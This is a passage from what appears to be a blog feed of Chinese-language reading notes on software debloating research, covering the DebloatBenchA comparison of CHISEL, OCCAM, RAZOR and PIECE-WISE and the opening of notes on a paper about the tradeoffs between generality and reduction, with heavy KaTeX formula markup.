ROP中,单个工具最好情况是CHISEL,减少了28.2%,而CO,CR,COR表现都更出色,分别为45.9%、40.4%和45.8%。</li></ul></li></ul></li><li><p>对于CHISEL和PIECE-WISE的组合,在使用CHISEL进行去膨胀后,PIECE-WISE只能在去膨胀的10个程序中成功编译五个,且这些程序中,grep,date和tar三个程序的变体无法被PIECE_WISE编译.这是因为musl-libc和glibc不兼容导致的,CHISEL使用的glibc而PIECE-WISE使用的musl-libc</p></li><li><p><strong>组合总结</strong></p><ul><li>正确性:对于非Chisel流水线，它能够生成正确的二进制文件</li><li>大小:CO组合由于单个方法</li><li>Gadget:CO,COR组合均优于单个Chisel</li></ul></li></ul><h3 id="6-%E8%AE%A8%E8%AE%BA" tabindex="-1">6 讨论</h3><h3 id="6.1-%E8%AE%BE%E8%AE%A1%E9%80%89%E6%8B%A9%E7%9A%84%E5%BD%B1%E5%93%8D" tabindex="-1">6.1 设计选择的影响</h3><ul><li><strong>CHISEL在测试用例上的依赖</strong>:<ul><li>我们的评估揭示了CHISEL在二进制文件上的正确性最弱,这是因为CHISEL对测试脚本有着很强的依赖.同时这些脚本也很难保证是对的,即使脚本正确,CHISEL也可能出现问题.</li><li>在我们的实验中,平均有超过96%的去膨胀的时间是用在了运行属性测试脚本上</li></ul></li><li><strong>OCCAM的部分求值法</strong>:<ul><li>部分求值法降低了OCCAM的可用性,它只允许非冲突的标志存在于去膨胀的二进制程序中.(我们称两个标志是非冲突的,仅当它们可以在同一个执行过程中同时执行).因此,对于两个冲突的标志,需要创建两个变体.</li><li>然而,我们要注意到在OCCAM中通过部分求值法,可以使得 去膨胀程序 易于通过配置去设置,以为其不需要小心和无聊地使用测试用例,其质量会影响去膨胀二进制文件地可用性</li></ul></li><li><strong>RAZOR中基于跟踪地简化</strong>:<ul><li>RAZOR的不同启发式搜索影响其正确性和简化性,所以我们需要对使用不同的启发方法进行充分评估,已选择最佳的启发方法,保留合理的功能,下图展示了启发度级别与正确性的关系</li><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_13.png" alt></li><li>此外,RAZOR的训练时间取决于提供给他的测试用例数量,下图展示了其关系</li><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_14.png" alt></li></ul></li><li><strong>PIECE-WISE中加载时间的缩减</strong>:<ul><li>PIECE-WISE在编译时计算程序的依赖图并将其添加到ELF头文件中的.dep部分,用于减少加载时间,但这显著增加了大小.对于一些应用而言,大小的增加可能盖过了其好处</li></ul></li></ul><h3 id="6.2-%E7%A0%94%E7%A9%B6%E7%9A%84%E9%99%90%E5%88%B6" tabindex="-1">6.2 研究的限制</h3><ul><li>目前DebloatBenchA仅选择了每一类中的单个工具,并提供了深入的分析.然而工具的覆盖范围可以很容易地进行扩展.</li><li>目前 目标应用程序的选择受到了 去膨胀器功能的限制</li><li>我们创建了大量的测试用例来覆盖训练和测试,但总有疏漏</li></ul><h3 id="7-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">7 相关工作</h3><ul><li><strong>C/C++程序特化方向</strong>:<ul><li>主要有三个方向<ul><li>(1)源代码级（例如Chisel [22]、C-Reduce [42]、Perses [46]和DomGad [52]）</li><li>(2)中间代码级（例如Trimmer [6, 7, 44]、LLPE [45]、LMCAS [8]和Occam [31, 33]）</li><li>(3)二进制代码级.（例如Razor [37]）</li><li>另外也有库级别 ( 例如Piece-wise [39]、BlankIt [36]和Nibbler [5])</li></ul></li><li>DebloatBenchA是第一个系统地审查所有类别的工具以强调每种方法的优势和劣势的基准测试。</li><li>我们的评估还强调，组合多种方法具有比任何单个工具更好的性能的潜力。</li></ul></li><li><strong>环境/系统级的去膨胀</strong><ul><li>MultiK [29]和shard [4]提供了针对应用程序的内核级别的去bloat化</li><li>Cimplifier [41]使用动态分析来检测容器内的具有逻辑上不同之处的应用程序，并自动将其分解为较小的容器。</li><li>LightBlue [50]利用静态分析执行应用程序引导的固件去bloat化。</li><li>CDE [20]利用执行跟踪来识别应用程序的依赖项以实现无缝移植</li><li>最近，Hassan等人开发了一个名为DebloatBenchC的框架来评估容器去bloat化器[21]。</li></ul></li><li><strong>去膨胀的其它程序语言的研究</strong><ul><li>Piranha [40]针对Objective-C</li><li>JShrink [16]; JSCleaner [17], Lacuna [35], Muzeel [30],Stubbifier [48] and [49] 针对JS</li><li>Red [26]，JAX [47]，BloatLid [18] Depclean [2]和[9]分别针对基于Java和PHP的应用程序</li><li>也有在字节码上的研究 [19, 28].</li></ul></li></ul><h3 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h3><ul><li><ol><li>我们提出了DebloatBenchA,一个可扩展可维护的基准测试框架,用于对程序去膨胀方法进行严格的评估</li></ol></li><li><ol start="2"><li>我们将Chisel,Occam,Razor,Piece-wise集成到该框架中,进行了全面的比较研究.</li></ol><ul><li>我们发现保守的静态分析工具更能产生正确的二进制文件</li><li>而激进的动态分析工具在减少二进制文件大小,gadget类方面表现更好</li><li>而Piece-wise在增大二进制文件大小的同时未能减少任何gadget类</li><li>基于测试用例的工具在非coreuntils程序上的表现不好</li></ul></li><li><ol start="3"><li>对不同阶段多去膨胀工具的组合使用开辟了道路</li></ol></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (1)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(1)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="studying-and-understanding-the-tradeoffs-between-generality-and-reduction-in-software-debloating" tabindex="-1">Studying and Understanding the Tradeoffs Between Generality and Reduction in Software Debloating</h2><p>2022,In 37th IEEE/ACM International Conference on Automated Software Engineering (CCF A类会议)</p><p>Q. Xin, Q. Zhang, and A. Orso, “Studying and understanding the<br>tradeoffs between generality and reduction in software debloating,”<br>in Proceedings of the 37th IEEE/ACM International Conference on<br>Automated Software Engineering, ASE ’22, (New York, NY, USA),<br>Association for Computing Machinery, 2023.</p><h3 id="00-%E6%91%98%E8%A6%81" tabindex="-1">00 摘要</h3><ul><li><p>现有程序去膨胀方法通过使用配置文件作为识别程序特性的依据,通常是以一组输入的形式提供.具体来说,给定一个程序和输入,这些技术将生成一个在这些输入上正确运行的简化程序</p></li><li><p>然而只关注简化会和输入过拟合,为此我们需要考虑通用性,即未在配置文件中的输入的正确性</p></li><li><p>为此,我们对4种去膨胀方法(3种SOTA,1种基准方法)在25个程序和这些程序的不同输入集上进行了减少和通用性的实证评估。结果表明，这些方法确实会产生对使用的输入过拟合并且通用性较低的程序。</p></li><li><p>基于这些结果，我们还提出了两种新的增强方法，并评估了它们的有效性。这个额外的评估结果显示，这两种方法可以在不显著影响减少程序大小的情况下提高程序的通用性。</p></li><li><p>最后，由于不同的方法具有不同的优势和劣势，我们还提供了指南，以帮助用户根据其特定需求和背景选择最合适的方法。</p></li></ul><h3 id="01-%E4%BB%8B%E7%BB%8D" tabindex="-1">01 介绍</h3><ul><li><p>软件越来越复杂,带来的软件肿胀问题影响软件性能和安全</p></li><li><p>基于输入的指定软件预期功能方法: 通过输入来指定软件预期功能.然而因为输入只能覆盖有限的功能,所以这种方法会导致过拟合</p></li><li><p>因此简化和通用性需要同时考虑,然而这两点有着固有的矛盾,我们的去膨胀方法要在这两点间取得平衡</p></li><li><p>早期去膨胀方法激进的追求大小的缩减,忽略了通用性;</p></li><li><p>两种新的方法考虑了通用性,但未正确地衡量,并且没有 简化和通用性地平衡</p><ul><li><strong>Debop</strong>:(Qi Xin, Myeongsoo Kim, Qirun Zhang, and Alessandro Orso. 2020. Program debloating via stochastic optimization. In 2020 IEEE/ACM 42st International Conference on Software Engineering: New Ideas and Emerging Results (ICSE-NIER).):根据提供的输入评估程序的通用性，而不考虑未观察到的输入</li><li><strong>Razor</strong>(Chenxiong Qian, Hong Hu, Mansour Alharthi, Pak Ho Chung, Taesoo Kim,and Wenke Lee. 2019. RAZOR: A Framework for Post-deployment Software Debloating):使用一个弱（基于崩溃）的预测模型来确定程序的行为正确性，并评估通用性</li></ul></li><li><p>进行一项研究,评估基于输入地去膨胀方法在 简化,通用性及二者权衡之间地表现</p><ul><li>调查了3种面向C程序的SOTA(Chisel,Debop,Razor),1种基准方法(Cov)基于代码覆盖率进行去膨胀。</li><li>应用于包含25个程序的两个不同基准测试集,进行 去膨胀和通用性评估</li><li>评估方法<ul><li>评估去膨胀方法:使用两种简化类型:基于大小和攻击面</li><li>评估通用性方法:使用两种通用类型:正确性(C-通用性) 和 鲁棒性(R-通用性)</li><li>评估二者间的平衡:使用F-score度量</li></ul></li></ul></li><li><p>实验结果显示</p><ul><li>Chesel和Debop并未考虑程序处理未观察到的输入的能力,会较低的C通用性</li><li>Razor通过基于覆盖率的减少和基于启发式的增强,在C通用性上表现较好,但在R通用性上表现较差</li></ul></li><li><p>为了解决这些问题,我们提出了两种增强方法CovF和CovA,旨在提高R,C-通用性和通用性和简化的权衡,这俩种方法均基于Cov,但是CovF基于模糊测试,而CovA基于分析的代码增强,以此识别互补相关的代码,并在去膨胀时简化这些代码</p></li><li><p>具体来说,对于程序p和输入集合I</p><ul><li><ol><li>CovF和CovA首先调用Cov从p中删除未被I执行的代码,得到去膨胀程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>.</li></ol></li><li><ol start="2"><li>CovF利用模糊测试生成可以暴露<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>鲁棒性问题的输入,从p中恢复代码,消除这些问题;CovA利用静态和动态分析计算得到信息来增强<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,即通过静态程序依赖关系,执行频率和覆盖灵活性等</li></ol></li></ul></li><li><p>直观地说,CovF专注于导致<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>崩溃地代码,CovA保留与<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>c</mi><mi>o</mi><mi>v</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{cov}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">co</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>相关地代码,由此产生具有增强鲁棒性和正确性地程序</p></li><li><p>实际情况下去膨胀涉及多个相互冲突地目标,本次研究中有四个具体目标</p><ul><li>高的简化度</li><li>攻击面减少</li><li>C-通用性</li><li>R-通用性</li></ul></li><li><p>同时我们所考虑的方法各有优缺点,为此我们提供了一个指南,帮助用户选择方法</p></li></ul><h3 id="02-%E8%83%8C%E6%99%AF" tabindex="-1">02 背景</h3><h4 id="2.1-%E5%9F%BA%E4%BA%8E%E8%BE%93%E5%85%A5%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80%E6%96%B9%E6%B3%95" tabindex="-1">2.1 基于输入的去膨胀方法</h4><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>为程序,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>为一组输入的集合,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></eq>为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>在输入为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span></eq>上的执行结果.</li><li>给定<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,基于输入的去膨胀方法通过生成一个简化程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>,使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>∈</mo><mi>I</mi></mrow><annotation encoding="application/x-tex">i\in I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p&#x27;(i)=p(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></eq></li></ul><h4 id="2.2-%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95" tabindex="-1">2.2 评估方法</h4><h5 id="2.2.1-%E7%AE%80%E5%8C%96%E5%BA%A6" tabindex="-1">2.2.1 简化度</h5><ul><li>两种简化度度量方法<ul><li>基于大小的简化度(size reduction): <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>r</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>−</mo><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">sred(p,p&#x27;)=\frac{size(p) - size(p&#x27;)}{size(p)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">sre</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.5845em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0645em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">ze</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">ze</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">ze</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></eq>为程序大小,有两种度量方法<ul><li><ol><li>语句数</li></ol></li><li><ol start="2"><li>执行时内存的字节数</li></ol></li></ul></li><li>基于攻击面的简化度(attack surface reduction): <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>r</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>a</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>−</mo><mi>a</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>f</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi>a</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">ared(p,p&#x27;)=\frac{asurf(p)-asurf(p&#x27;)}{asurf(p)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">re</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.5845em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0645em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math 